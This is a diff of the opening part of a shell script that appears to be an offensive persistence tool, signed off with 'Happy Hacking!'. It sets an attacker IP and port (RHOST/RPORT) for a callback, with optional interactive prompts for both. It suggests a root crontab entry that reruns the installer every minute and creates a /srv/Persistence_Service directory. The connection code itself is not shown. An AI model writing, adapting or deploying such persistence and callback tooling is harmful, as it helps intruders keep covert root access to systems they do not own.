@@ -1,8 +1,30 @@
+#
+#There's two main ways to use this:
+#1. Static Method
+#	a. This method is the simplest and doesn't require the interactive shell.
+#	b. This method works with /etc/crontab quite nicely, too
+#	c. Example /etc/crontab entry: "* * * * * root /root/Install.sh"
+#2. Interactive Method
+#	a. If you have an interactive shell, this is a tad more customizable.
+#
+#ENSURE THAT YOU DISABLE THE ALTERNATE METHOD. BOTH CANNOT BE ENABLED AT THE SAME TIME!
+#
+#Happy Hacking!
+# -N
+#
+
+
+#STATIC Method:
 RHOST=10.0.0.7
 RPORT=9999
-#Interactive Methods
+
+#INTERACTIVE Method:
 #read -p 'Attacker IP:' RHOST
 #read -p 'Attacker Port:' RPORT
+
+
+
+
 cd /srv
 echo "Creating Persistence_Service Directory.."
 mkdir /srv/Persistence_Service
